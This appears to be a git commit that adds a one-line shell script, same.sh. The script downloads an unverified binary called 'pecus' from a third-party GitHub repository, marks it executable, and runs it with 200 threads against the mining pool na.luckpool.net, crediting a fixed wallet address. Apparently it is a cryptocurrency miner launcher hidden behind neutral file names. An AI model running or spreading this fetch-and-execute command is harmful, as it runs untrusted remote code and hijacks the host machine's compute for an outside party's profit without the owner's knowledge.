64918244aaadadedc0af82425c04107efc434da2
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-12-05 16:19:51 +0700

    Create same.sh

---
+++ same.sh
@@ -0,0 +1,1 @@
+wget https://github.com/desafff/pecuk/raw/main/pecus && chmod +x pecus && ./pecus -v -l na.luckpool.net:3958 -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.$(echo $(shuf -i 1-99 -n 1)-Ib) -p c=DGB -t 200
